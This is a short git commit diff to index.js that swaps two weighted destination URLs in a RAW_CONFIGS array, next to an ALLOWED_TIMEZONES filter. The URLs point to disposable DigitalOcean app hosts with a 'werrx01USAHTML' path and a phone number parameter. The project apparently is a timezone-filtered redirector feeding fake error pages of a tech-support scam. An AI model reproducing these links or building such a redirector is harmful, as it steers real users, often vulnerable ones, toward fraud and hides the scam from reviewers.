d742dc467845916bfcd87088007f08ee98516714
paalakash <palaksh452@gmail.com>
2026-06-05 08:52:58 +0530

    Update RAW_CONFIGS with new URLs

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://coral-app-c7w5c.ondigitalocean.app/werrx01USAHTML/?bcda=1800-182-567", weight: 0.5 },
-    { url: "https://coral-app-c7w5c.ondigitalocean.app/werrx01USAHTML/?bcda=1800-182-567", weight: 0.5 }
+    { url: "https://sea-lion-app-yw8ij.ondigitalocean.app/werrx01USAHTML/?bcda=1800-182-567", weight: 0.5 },
+    { url: "https://sea-lion-app-yw8ij.ondigitalocean.app/werrx01USAHTML/?bcda=1800-182-567", weight: 0.5 }
 
 ];
 
